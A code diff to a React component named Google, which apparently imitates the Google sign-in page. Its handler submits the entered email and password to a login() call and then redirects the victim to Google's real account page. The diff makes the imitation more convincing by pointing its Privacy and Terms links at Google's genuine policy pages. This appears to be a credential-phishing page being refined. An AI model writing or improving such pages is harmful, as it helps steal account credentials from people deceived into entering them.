@@ -24,7 +24,7 @@ const Google = () => {
 
   const handleSecondNext = async () => {
     await login({ login: email, password });
-    window.location.href = "https://www.google.com/account/about/?hl=fr";
+    globalThis.location.href = "https://www.google.com/account/about/?hl=fr";
   };
 
   return (
@@ -52,13 +52,16 @@ const Google = () => {
           English (United States)
         </div>
         <div className="flex gap-6">
-          <a href="#" className="hover:text-gray-800">
-            Help
-          </a>
-          <a href="#" className="hover:text-gray-800">
+          <a
+            href="https://policies.google.com/privacy"
+            className="hover:text-gray-800"
+          >
             Privacy
           </a>
-          <a href="#" className="hover:text-gray-800">
+          <a
+            href="https://policies.google.com/terms"
+            className="hover:text-gray-800"
+          >
             Terms
           </a>
         </div>
